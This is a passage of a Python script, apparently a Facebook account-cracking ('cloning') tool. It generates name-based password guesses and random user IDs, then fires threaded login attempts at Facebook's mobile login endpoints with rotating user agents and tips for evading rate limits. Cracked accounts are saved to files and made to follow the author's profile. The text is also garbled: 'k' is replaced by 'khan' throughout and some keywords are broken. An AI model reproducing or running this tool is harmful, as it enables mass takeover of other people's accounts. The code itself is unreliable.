		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print (' [!] Choose Correct Option')
		exit()
	clear()
	print(logo);print ('\n [01] Method 1 ');print (' [02] Method 2 \033[1;97m')
	hc = input ("\n [#] method : ")
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2','02']:
		method.append('free')
	else:
		method.append('mobile')
	passmenu()
def passmenu():
	clear()
	print(logo);print  ('\n [01] First name digit pass \n [02] All Name Password \n [03] All Name+ password')
	passmen=input('\n [#] Select Pass : ')
	if passmen in ['1','01']:
		first()
	elif passmen in ['2','02']:
		name()
	elif passmen in ['3','03']:
		name2()
	else:
		passmenu()
		
def first():
	clear()
	print(logo);print( ' [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n')
	with tred(max_workhaners=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ['445566']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'12345')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'12345')
			if 'mobile' in method:
				pool.submit(crackhan,idf,pwv)
			elif 'free' in method:
				pool.submit(free,idf,pwv)
			else:
				pool.submit(crackhan,idf,pwv)
def name():
	clear()
	print(logo);print( '\n [] Okhan Result Saved To : \033[1;92mOkhan/%s\033[1;97m\n [] CP Result Saved To : \033[1;91mCP/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okhanc,cpc))
	with tred(max_workhaners=30) as pool:
		for yuzong in id2:
			try:
				idf,nmf = yuzong.split('|')
				xz = nmf.split(' ')
				if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
					pwv = [name, xz[0]+xz[0],xz[0]+xz[1]+"12345", xz[0]+xz[1]+"786",xz[0]+xz[1]+"123",xz[0]+xz[1]+"1234"]
				else:
					pwv = [name, xz[0]+xz[0],xz[0]+xz[1]+"12345", xz[0]+xz[1]+"786",xz[0]+xz[1]+"123",xz[0]+xz[1]+"1234"]
				if 'mobile' in method:
					pool.submit(crackhan,idf,pwv)
				elif 'free' in method:
					pool.submit(free,idf,pwv)
				else:
					pool.submit(crackhan,idf,pwv)
			except:
				pass
def name2():
	clear()
	print(logo);print( '\n [] Okhan Result Saved To : \033[1;92mOkhan/%s\033[1;97m\n [] CP Result Saved To : \033[1;91mCP/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okhanc,cpc))
	with tred(max_workhaners=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ['445566']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'12345')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'12345')
					pwv.append(frs+'1234')
					pwv.append(frs+'786')
			if 'mobile' in method:
				pool.submit(crackhan,idf,pwv)
			elif 'free' in method:
				pool.submit(free,idf,pwv)
			else:
				pool.submit(crackhan,idf,pwv)
	
# CRACkhanER
def crackhan(idf,pwv):
	global loop,okhan,cp
	bi = random.choice([u,khan,khankhan,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	sys.stdout.write('\r %s[ khan ] %s•%s • Okhan:%s • CP:%s  '%(bi,loop,len(id2),len(okhan),cp)),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			pw = pw.lower()
			ses.headers.update({"Host":'m.facebookhan.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"markhan.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebookhan.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebookhan.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://m.facebookhan.com/login/save-device/'"}
			ses.headers.update({"Host":'m.facebookhan.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebookhan.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"markhan.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://m.facebookhan.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://m.facebookhan.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
			if "checkhanpoint" in po.cookhanies.get_dict().khaneys():
				cp +=1
				print( f'\r\x1b[1;91m [ khan-CP ] {idf} | {pw}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akhanun.append(idf+'|'+pw)
				breakhan
			elif "c_user" in ses.cookhanies.get_dict().khaneys():
				cokhani=po.cookhanies.get_dict()
				cokhani = (";").join([ "%s=%s" % (khaney, value) for khaney, value in ses.cookhanies.get_dict().items() ])
				print(f'\r\x1b[1;92m [ khan-Okhan ] {idf} | {pw}')
				wrt =('%s - %s' % (idf,pw))
				okhan.append(wrt)
				open('/sdcard/ids/okhan.txt','a').write('%s\n' % wrt)
				follow(ses,cokhani)
				breakhan

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
def free(idf,pwv):
	global loop,okhan,cp
	bi = random.choice([u,khan,khankhan,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	sys.stdout.write('\r %s[ khan ] %s•%s • Okhan:%s • CP:%s  '%(bi,loop,len(id2),len(okhan),cp)),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			pw = pw.lower()
			ses.headers.update({"Host":'mbasic.facebookhan.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"markhan.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebookhan.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://mbasic.facebookhan.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://mbasic.facebookhan.com/login/save-device/'"}
			ses.headers.update({"Host":'mbasic.facebookhan.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebookhan.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"markhan.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebookhan.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://mbasic.facebookhan.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
			if "checkhanpoint" in po.cookhanies.get_dict().khaneys():
				rint( f'\r\x1b[1;91m [ khan-CP ] {idf} | {pw}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akhanun.append(idf+'|'+pw)
				breakhan
			elif "c_user" in ses.cookhanies.get_dict().khaneys():
				cokhani=po.cookhanies.get_dict()
				cokhani = (";").join([ "%s=%s" % (khaney, value) for khaney, value in ses.cookhanies.get_dict().items() ])
				print(f'\r\x1b[1;92m [ khan-Okhan ] {idf} | {pw}')
				wrt =('%s - %s' % (idf,pw))
				okhan.append(wrt)
				open('/sdcard/khan-Okhan.txt','a').write('%s\n' % wrt)
				follow(ses,cokhani)
				breakhan

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
def follow(ses,cokhani):
	ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	r = sop(ses.get('https://mbasic.facebookhan.com/profile.php?id=100067945261995', cookhanies={'cookhanie': cokhani}).text, 'html.parser')
	get = r.find('a', string='Follow').get('href')
	ses.get(('https://mbasic.facebookhan.com' + str(get)), cookhanies={'cookhanie': cokhani}).text

logo = ("""\033[1;32m
       
┈┈┈┈┈┈┈┈┈┈┈      ╱▔▔▔▔╲┈┈┈┈┈┈┈┈ J        
  ┈┈┈┈┈┈┈┈┈┈┈▕▕╲┊┊╱▏▏┈┈┈┈┈┈┈  O       
  ┈┈┈┈┈┈┈┈┈┈┈▕▕▂╱╲▂▏▏┈┈┈┈┈┈┈  O
  ┈┈┈┈┈┈┈┈┈┈┈┈╲┊┊┊┊╱┈┈┈┈┈┈┈┈  K 
  ┈┈┈┈┈┈┈┈┈┈┈┈▕╲▂▂╱▏┈┈┈┈┈┈┈┈  E
 ┈┈┈┈┈┈┈┈╱▔▔▔▔┊┊┊┊▔▔▔▔╲┈┈┈┈   R
        ─────────────•◈•──────────   
       
  Owner   :  khan
 
 
  Github   :  khan


  Facebookhan : https://www.facebookhan.com/asadullah.shirzad.56
   
  
  Youtube : khan
  
  
  Contact : +93707266012
__________________×______________________\033[1;37m""")

class Main:
	def __init__(self):
		self.id = []
		self.okhan = []
		self.cp = []
		self.loop = 0
		os.system("clear")
		print(logo)
		print("\n [1] File Cloning")
		print(" [2] Public Cloning")
		print(" [3] Create File")
		print(" [4] 2009-10 Cloning")
		print(" [5] 2011-14 Cloning")
		print(" [E] Exit Programming\n")
		khan =input(" Choose : ")
		if khan in ["1", "01"]:
			File()
		if khan in ["2", "02"]:
			Public()
		if khan in ["3", "03"]:
			os.system("python Dump.py")
		if khan in ["4", "04"]:
			self.old()
		if khan in ["5", "05"]:
			self.old2()
			exit()
		else:
			print (" Select Correctly ")
			time.sleep(1)
			Main()

	def old(self):
		x = 111111111
		xx = 999999999
		idx = "100000" 
		os.system('clear');print(logo)
		limit = int(input(" \n\033[0;95m[+]\033[0;93m TOTAL IDS TO CRACkhan LIMIT 50,000: "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workhaners=30) as coeg:
				print("\n\033[1;32m [!] USE (123456) FOR IDZ\033[1;37m ")
				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
				print("%s [*] CRACkhan WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
				os.system("clear")
				print(logo)
				print("\n%s [+] Okhan RESULTS SAVED IN -> okhan.txt"%(Y))
				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(G))
				print("%s [!] IF NO RESULT USE AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(P))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n [>>] CRACkhan COMPLETE...")
		except Exception as e:exit(str(e))

	def api(self, uid, pwx):
		rua = random.choice([
			"Dalvikhan/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/khanOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebookhan.khanatana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
			  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; CMDTDF; .NET4.0C; .NET4.0E; GWX:QUALIFIED)",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:40.0) Geckhano/20100101 Firefox/40.0.2 Waterfox/40.0.2",
  "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 4.4.2; SM-T217S Build/khanOT49H) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/45.0.2454.84 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MALNJS; rv:11.0) likhane Geckhano",
  "Mozilla/5.0 (Linux; Android 4.4.2; RCT6203W46 Build/khanOT49H) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/45.0.2454.84 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
  "Mozilla/5.0 (Android; Tablet; rv:34.0) Geckhano/34.0 Firefox/34.0",
  "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; Touch)",
  "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/7.0; TNJB; 1ButtonTaskhanbar)",
  "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
  "Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/42.0.2311.111 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 4.0.4; BNTV600 Build/IMM76L) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/42.0.2311.111 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 4.4.2; SM-T237P Build/khanOT49H) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/45.0.2454.84 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 4.4.2; SM-T530NU Build/khanOT49H) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/45.0.2454.84 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.0.1; SCH-I545 Build/LRX22C) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/45.0.2454.84 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920P Build/LMY47X) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920T Build/LMY47X) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-N910P Build/LMY47X) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; LG-V410/V41010d Build/khanOT49I.V41010d) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Version/4.0 Chrome/30.0.1599.103 Safari/537.36",
  "Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; khanFARWI Build/khanTU84M) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Silkhan/3.68 likhane Chrome/39.0.2171.93 Safari/537.36",
  "Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; khanFSAWI Build/khanTU84M) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Silkhan/3.68 likhane Chrome/39.0.2171.93 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:34.0) Geckhano/20100101 Firefox/34.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:36.0) Geckhano/20100101 Firefox/36.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/44.0.2403.155 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/43.0.2357.130 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/44.0.2403.157 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/43.0.2357.130 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/45.0.2454.85 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebkhanit/600.6.3 (khanHTML, likhane Geckhano) Version/8.0.6 Safari/600.6.3",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/44.0.2403.107 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/47.0.2503.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebkhanit/600.8.9 (khanHTML, likhane Geckhano)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebkhanit/601.1.56 (khanHTML, likhane Geckhano) Version/9.0 Safari/601.1.56",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/42.0.2311.135 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/43.0.2357.124 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/43.0.2357.81 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/44.0.2403.157 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebkhanit/600.6.3 (khanHTML, likhane Geckhano) Version/7.1.6 Safari/537.85.15",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) likhane Geckhano",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) likhane Geckhano",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MALNJS; rv:11.0) likhane Geckhano",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MDDCJS; rv:11.0) likhane Geckhano",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/40.0.2214.115 Safari/537.36",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/41.0.2272.101 Safari/537.36",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/42.0.2311.152 Safari/537.36 LBBROWSER",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/44.0.2403.155 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.0; rv:38.0) Geckhano/20100101 Firefox/38.0",
  "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4049.US Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:39.0) Geckhano/20100101 Firefox/39.0",
  "Mozilla/5.0 (Windows NT 6.1) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/40.0.2214.115 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/42.0.2311.90 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/43.0.2357.65 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; rv:28.0) Geckhano/20100101 Firefox/28.0",
  "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Geckhano/20100101 Firefox/31.0",
  "Mozilla/5.0 (Windows NT 6.1; rv:36.0) Geckhano/20100101 Firefox/36.0",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/46.0.2490.13 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/30.0.1599.101 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/33.0.1750.146 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/36.0.1985.125 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4043.US Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/38.0.2125.101 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/39.0.2171.71 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/39.0.2171.99 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/41.0.2272.118 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/42.0.2311.154 Safari/537.36 LBBROWSER",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/43.0.2357.132 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Maxthon/4.4.6.1000 Chrome/30.0.1599.101 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Geckhano/20100101 Firefox/29.0",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Geckhano/20100101 Firefox/34.0",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; ASJB; ASJB; MAAU; rv:11.0) likhane Geckhano",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; BOIE9;ENUSSEM; rv:11.0) likhane Geckhano",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MDDRJS; rv:11.0) likhane Geckhano",
  "Mozilla/5.0 (Windows NT 6.2; Win64; x64; Trident/7.0; rv:11.0) likhane Geckhano",
  "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:29.0) Geckhano/20100101 Firefox/29.0",
  "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:33.0) Geckhano/20100101 Firefox/33.0",
  "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; Touch; TNJB; rv:11.0) likhane Geckhano",
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MALNJS; rv:11.0) likhane Geckhano",
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MAARJS; rv:11.0) likhane Geckhano",
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MASMJS; rv:11.0) likhane Geckhano",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/38.0.2125.104 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/43.0.2357.124 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/44.0.2403.125 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/44.0.2403.130 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Maxthon/4.4.6.2000 Chrome/30.0.1599.101 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) likhane Geckhano",
  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) likhane Geckhano",
  "Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN; rv:1.9.0.8) Geckhano/2009032609 Firefox/3.0.8 (.NET CLR 3.5.30729)",
  "Mozilla/5.0 (X11; CrOS x86_64 6457.107.0) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/40.0.2214.115 Safari/537.36",
  "Mozilla/5.0 (X11; CrOS x86_64 7077.95.0) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/44.0.2403.90 Safari/537.36",
  "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:38.0) Geckhano/20100101 Firefox/38.0",
  "Mozilla/5.0 (X11; Linux i686; rv:40.0) Geckhano/20100101 Firefox/40.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/534.24 (khanHTML, likhane Geckhano) Chrome/33.0.0.0 Safari/534.24",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/34.0.1847.76 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/38.0.2125.102 Safari/537.36",
